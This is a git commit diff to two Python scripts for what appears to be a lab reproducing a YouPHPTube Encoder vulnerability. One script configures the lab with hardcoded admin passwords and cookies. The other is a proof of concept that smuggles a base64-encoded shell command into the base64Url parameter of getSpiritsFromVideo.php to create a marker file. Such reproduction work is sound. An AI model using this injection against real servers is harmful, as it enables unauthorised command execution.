5e7cde1582362cee8218bb01b85aabb0db13405d
lishuang <894597649@qq.com>
2020-04-28 22:37:10 +0800

    本地成功版本

--- File/datafill.py
+++ File/datafill.py
@@ -1,61 +1,109 @@
 import requests
 import os
+import time
+
+cookies = {"PHPSESSID": "0acab05af285106e154184a65c8ae0a6"}
+
 
 def configyouphptube():
-    burp0_url = "http://web/install/checkConfiguration.php"
-    burp0_data = {"webSiteRootURL": "http://web", "systemRootPath": "/var/www/html/", "webSiteTitle": "YouPHPTube", "databaseHost": "mysql", "databasePort": "3306", "databaseUser": "root", "databasePass": "password", "databaseName": "youPHPTube", "mainLanguage": "en", "systemAdminPass": "cuccs123", "contactEmail": "894597649@qq.com", "createTables": "2"}
-    requests.post(burp0_url, data=burp0_data)
+    burp0_url = "http://web:8000/install/checkConfiguration.php"
+    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0",
+                     "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+                     "Accept-Encoding": "gzip, deflate",
+                     "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                     "X-Requested-With": "XMLHttpRequest", "Origin": "http://web:8000/", "Connection": "close",
+                     "Referer": "http://web:8000/install/index.php"}
+    burp0_data = {"webSiteRootURL": "http://web:8000/", "systemRootPath": "/var/www/html/",
+                  "webSiteTitle": "YouPHPTube", "databaseHost": "mysql", "databasePort": "3306", "databaseUser": "root",
+                  "databasePass": "password", "databaseName": "youPHPTube", "mainLanguage": "en",
+                  "systemAdminPass": "cuccs123", "contactEmail": "894597649@qq.com", "createTables": "2"}
+    res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
+    print(res)
+
 
 def configencoder():
-    burp0_url = "http://web/login"
-    burp0_data = {"user": "admin", "pass": "cuccs123", "siteURL": "http://web"}
-    requests.post(burp0_url,data=burp0_data)
+    burp0_url = "http://web:8000/login"
+    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0",
+                     "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+                     "Accept-Encoding": "gzip, deflate",
+                     "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                     "Origin": "http://encoder:8000", "Connection": "close",
+                     "Referer": "http://encoder:8000/install/index.php"}
+    burp0_data = {"user": "admin", "pass": "cuccs123", "siteURL": "http://web:8000/"}
+    requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
 
-    burp0_url = "http://encoder:8889/install/checkConfiguration.php"
-    burp0_cookies = {"PHPSESSID": "aa899c83e57d809e8cf33bd2af173277"}
-    burp0_data = {"webSiteRootURL": "http://encoder:8889/", "systemRootPath": "/var/www/html/", "databaseHost": "mysql", "databaseUser": "root", "databasePass": "password", "databaseName": "youPHPTube-Encoder", "createTables": "2", "siteURL": "http://web", "inputUser": "admin", "inputPassword": "cuccs123", "allowedStreamers": "http://web", "defaultPriority": "1"}
-    requests.post(burp0_url, cookies=burp0_cookies, data=burp0_data)
-
-    
-def login(host):
-    burp0_data = {"user": "admin", "pass": "cuccs123", "siteURL": "http://web", "encodedPass": "false"}
-    burp0_cookies = {"_ga": "GA1.1.500274602.1586273581", "PHPSESSID": "5ef3964b63d26a2097b462daafdbd034",
-                     "_gid": "GA1.1.1691531968.1586788006"}
-    res = requests.post(host, cookies=burp0_cookies,data=burp0_data)
+    burp0_url = "http://encoder:8000/install/checkConfiguration.php"
+    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0",
+                     "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+                     "Accept-Encoding": "gzip, deflate",
+                     "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                     "X-Requested-With": "XMLHttpRequest", "Origin": "http://encoder:8000",
+                     "Connection": "close", "Referer": "http://encoder:8000/install/index.php"}
+    burp0_data = {"webSiteRootURL": "http://encoder:8000/", "systemRootPath": "/var/www/html/",
+                  "databaseHost": "mysql", "databaseUser": "root", "databasePass": "password",
+                  "databaseName": "youPHPTube-Encoder", "createTables": "2", "siteURL": "http://web:8000/",
+                  "inputUser": "admin", "inputPassword": "cuccs123", "allowedStreamers": "http://web:8000/",
+                  "defaultPriority": "1"}
+    res = requests.post(burp0_url, headers=burp0_headers, cookies=cookies, data=burp0_data)
     print(res)
 
-def queue(host):
-    burp0_cookies = {"_ga": "GA1.1.500274602.1586273581", "PHPSESSID": "5ef3964b63d26a2097b462daafdbd034",
-                     "_gid": "GA1.1.1691531968.1586788006"}
+
+def login(hostip):
+    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0",
+                     "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+                     "Accept-Encoding": "gzip, deflate",
+                     "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                     "X-Requested-With": "XMLHttpRequest", "Origin": "http://encoder:8000",
+                     "Connection": "close", "Referer": "http://encoder:8000/"}
+    burp0_data = {"user": "admin", "pass": "cuccs123", "siteURL": "http://web:8000/", "encodedPass": "false"}
+    res = requests.post(hostip, headers=burp0_headers, cookies=cookies, data=burp0_data)
+    print(res)
+
+
+def queue(hostip):
+    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0",
+                     "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+                     "Accept-Encoding": "gzip, deflate",
+                     "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                     "X-Requested-With": "XMLHttpRequest", "Origin": "http://encoder:8000/",
+                     "Connection": "close", "Referer": "http://encoder:8000/"}
     data = {"current": "1", "rowCount": "10", "sort[created]": "desc", "searchPhrase": ''}
-    res = requests.post(host, cookies=burp0_cookies, data=data)
+    res = requests.post(hostip, headers=burp0_headers, cookies=cookies, data=data)
     print(res)
 
-def admin(host):
-    burp0_cookies = {"_ga": "GA1.1.500274602.1586273581", "PHPSESSID": "5ef3964b63d26a2097b462daafdbd034", "_gid": "GA1.1.1691531968.1586788006", "_gat_youPHPTube": "1"}
-    burp0_data = {"user": "admin", "pass": "cuccs123"}
-    requests.post(host, cookies=burp0_cookies, data=burp0_data)
 
-def upload(filePath,filename):
-    url = 'http://encoder:8889/upload'
+
+def upload(filePath, filename):
+    url = 'http://encoder:8000/upload'
     files = {'upl': open(filePath + '/' + filename, 'rb')}
-    res = requests.post(url, files=files)
+    res = requests.post(url, cookies=cookies, files=files)
     print(res)
+
 
 
 if __name__ == '__main__':
-    a = 'http://encoder:8889/login'
-    aa = 'http://encoder:8889/queue.json'
-    aaa = 'http://web/login'
-    Path = './vedio'
-     
+    a = 'http://encoder:8000/login'
+    aa = 'http://encoder:8000/queue.json'
+    Path = '/video'
+
+    time.sleep(60)
+
     configyouphptube()
+    time.sleep(5)
+
     configencoder()
+    time.sleep(5)
+
     login(a)
     queue(aa)
-    admin(aaa)
+    time.sleep(5)
+
     r = os.listdir(Path)
     for index in range(len(r)):
         upload(Path, r[index])
-    print('Config success!')
     
+    login(a)
+    queue(aa)
+    time.sleep(60)
+    print('Config success!')
+
--- File/poc.py
+++ File/poc.py
@@ -1,37 +1,42 @@
 import requests
-
+import time
 
 ## 未执行注入之前访问注入文件名
 def check():
-    burp0_url = "http://encoder:8889/objects/thissystemhavebeenexploited1234"
-    burp0_cookies = {"PHPSESSID": "20a4eca1f4db870656270e54d8dec8ac", "_ga": "GA1.1.500274602.1586273581", "_gid": "GA1.1.150033256.1586273581"}
-    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
+    burp0_url = "http://192.168.1.9:8889/objects/thissystemhavebeenexploited1234"
+    burp0_cookies = {"PHPSESSID": "20a4eca1f4db870656270e54d8dec8ac", "_ga": "GA1.1.500274602.1586273581",
+                     "_gid": "GA1.1.150033256.1586273581"}
+    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0",
+                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                     "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+                     "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
     a = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
     return a
 
-### 注入：新建文件
 def poc():
-    burp0_url = "http://encoder:8889/objects/getSpiritsFromVideo.php?base64Url=YGVjaG8gMTIzIHwgdGVlIC1hIHRoaXNzeXN0ZW1oYXZlYmVlbmV4cGxvaXRlZDEyMzRg&format=jpg"
-    burp0_cookies = {"PHPSESSID": "20a4eca1f4db870656270e54d8dec8ac", "_ga": "GA1.1.500274602.1586273581", "_gid": "GA1.1.150033256.1586273581"}
-    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
+    burp0_url = "http://192.168.1.9:8889/objects/getSpiritsFromVideo.php?base64Url=YGVjaG8gMTIzIHwgdGVlIC1hIHRoaXNzeXN0ZW1oYXZlYmVlbmV4cGxvaXRlZDEyMzRg&format=jpg"
+    burp0_cookies = {"PHPSESSID": "20a4eca1f4db870656270e54d8dec8ac", "_ga": "GA1.1.500274602.1586273581",
+                     "_gid": "GA1.1.150033256.1586273581"}
+    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0",
+                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                     "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+                     "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
     a = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
     return a
 
-## 访问新建文件
-def downcheck():
-    burp0_url = "http://encoder:8889/objects/thissystemhavebeenexploited1234"
-    burp0_cookies = {"PHPSESSID": "20a4eca1f4db870656270e54d8dec8ac", "_ga": "GA1.1.500274602.1586273581", "_gid": "GA1.1.150033256.1586273581"}
-    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
-    a = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
-    return a
+
 
 if __name__ == "__main__":
-    a = check()
-    aa = poc()
-    aaa = downcheck()
-    if(a == 400 and aa == 200 and aaa ==200):
-      print('PoC success!')
-    else:
-       print('PoC fail!')
-      
+    time.sleep(100)
+    a1 = str(check())
+    poc()
+    time.sleep(10)
+    a = str(check())
+    time.sleep(10)
+
+    if (('404' in a1) and ('200' in a)) :
+        print('PoC success!')
+    else :
+        print('PoC fail!')
+
 
